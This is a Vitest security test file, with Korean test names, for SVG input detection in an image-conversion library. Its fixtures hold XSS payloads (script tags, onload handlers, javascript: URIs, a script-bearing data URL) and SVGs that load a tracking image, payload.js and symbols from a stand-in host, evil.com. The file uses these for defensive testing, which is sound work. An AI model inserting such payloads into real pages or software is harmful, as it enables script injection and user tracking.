import { describe, expect, it } from 'vitest';
import { detectSourceType } from '../../src/core/source-converter';
import { isInlineSvg } from '../../src/utils/svg-detection';

describe('보안: SVG 입력 검증', () => {
  it('보안 테스트 환경은 window.Image를 전역 목과 동일하게 맞춘다', () => {
    expect(window.Image).toBe(globalThis.Image);
    expect(window.HTMLImageElement).toBe(globalThis.HTMLImageElement);
  });

  describe('XSS 방지 - 스크립트 포함 SVG 감지', () => {
    it('인라인 스크립트가 포함된 SVG를 인라인 SVG로 인식한다', () => {
      const xssSvg =
        '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("xss")</script><rect width="100" height="100"/></svg>';
      expect(isInlineSvg(xssSvg)).toBe(true);
    });

    it('onload 이벤트 핸들러가 포함된 SVG를 인라인 SVG로 인식한다', () => {
      const xssSvg = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><circle cx="50" cy="50" r="40"/></svg>';
      expect(isInlineSvg(xssSvg)).toBe(true);
    });

    it('javascript: URI 참조가 포함된 SVG를 인라인 SVG로 인식한다', () => {
      const xssSvg =
        '<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><rect width="100" height="100"/></a></svg>';
      expect(isInlineSvg(xssSvg)).toBe(true);
    });

    it('XML 선언이 앞에 붙은 스크립트 포함 SVG를 인라인 SVG로 인식한다', () => {
      const xssSvg =
        '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg"><script>evil()</script></svg>';
      expect(isInlineSvg(xssSvg)).toBe(true);
    });

    it('DOCTYPE 선언이 앞에 붙은 스크립트 포함 SVG를 인라인 SVG로 인식한다', () => {
      const xssSvg =
        '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "">\n<svg xmlns="http://www.w3.org/2000/svg"><script>evil()</script></svg>';
      expect(isInlineSvg(xssSvg)).toBe(true);
    });
  });

  describe('외부 리소스 참조 SVG 감지', () => {
    it('외부 이미지를 참조하는 SVG를 인라인 SVG로 인식한다', () => {
      const svgWithExternalRef =
        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image href="http://evil.com/track.png" width="1" height="1"/></svg>';
      expect(isInlineSvg(svgWithExternalRef)).toBe(true);
    });

    it('외부 스크립트를 참조하는 SVG를 인라인 SVG로 인식한다', () => {
      const svgWithExternalScript =
        '<svg xmlns="http://www.w3.org/2000/svg"><script href="http://evil.com/payload.js"/></svg>';
      expect(isInlineSvg(svgWithExternalScript)).toBe(true);
    });

    it('use 태그로 외부 기호를 참조하는 SVG를 인라인 SVG로 인식한다', () => {
      const svgWithUseRef =
        '<svg xmlns="http://www.w3.org/2000/svg"><use href="http://evil.com/symbols.svg#icon"/></svg>';
      expect(isInlineSvg(svgWithUseRef)).toBe(true);
    });
  });

  describe('비정상 입력 경계 처리', () => {
    it('스크립트가 포함된 일반 HTML은 인라인 SVG로 인식하지 않는다 (false positive 방지)', () => {
      const htmlWithSvg = '<html><body><svg><script>alert(1)</script></svg></body></html>';
      expect(isInlineSvg(htmlWithSvg)).toBe(false);
    });

    it('div 내부에 중첩된 SVG는 인라인 SVG로 인식하지 않는다', () => {
      const embeddedSvg = '<div><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg></div>';
      expect(isInlineSvg(embeddedSvg)).toBe(false);
    });

    it('빈 문자열은 예외를 던지지 않고 false를 반환한다', () => {
      expect(() => isInlineSvg('')).not.toThrow();
      expect(isInlineSvg('')).toBe(false);
    });

    it('공백만 있는 문자열은 예외를 던지지 않는다', () => {
      expect(() => isInlineSvg('   ')).not.toThrow();
    });

    // isInlineSvg는 크기 제한을 강제하지 않는다. 실제 차단은 변환 레이어에서 이루어진다.
    it('매우 긴 문자열(10MB) 처리 시 예외를 던지지 않는다', () => {
      const largePadding = 'a'.repeat(10 * 1024 * 1024);
      const largeSvg = `<svg xmlns="http://www.w3.org/2000/svg"><!-- ${largePadding} --><rect width="100" height="100"/></svg>`;
      expect(() => isInlineSvg(largeSvg)).not.toThrow();
      expect(isInlineSvg(largeSvg)).toBe(true);
    });

    it('매우 긴 비-SVG 문자열 처리 시 예외를 던지지 않는다', () => {
      const largeNonSvg = 'x'.repeat(10 * 1024 * 1024);
      expect(() => isInlineSvg(largeNonSvg)).not.toThrow();
    });
  });

  describe('Data URL SVG 보안 검증', () => {
    it('스크립트가 포함된 Data URL SVG를 svg 타입으로 감지한다', () => {
      const xssDataUrl =
        'data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3C%2Fsvg%3E';
      expect(detectSourceType(xssDataUrl)).toBe('svg');
    });

    it('base64 인코딩된 Data URL SVG를 svg 타입으로 감지한다', () => {
      // base64("<svg xmlns='http://www.w3.org/2000/svg'><rect/></svg>")
      const base64Svg =
        'data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnPjxyZWN0Lz48L3N2Zz4=';
      expect(detectSourceType(base64Svg)).toBe('svg');
    });
  });

  describe('Blob 타입 SVG 감지', () => {
    it('image/svg+xml MIME 타입의 Blob은 svg 타입으로 감지한다', () => {
      const svgBlob = new Blob(['<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>'], {
        type: 'image/svg+xml',
      });
      expect(detectSourceType(svgBlob)).toBe('svg');
    });

    it('일반 MIME 타입의 Blob은 blob 타입으로 감지한다', () => {
      const pngBlob = new Blob([new Uint8Array([0x89, 0x50, 0x4e, 0x47])], {
        type: 'image/png',
      });
      expect(detectSourceType(pngBlob)).toBe('blob');
    });
  });
});
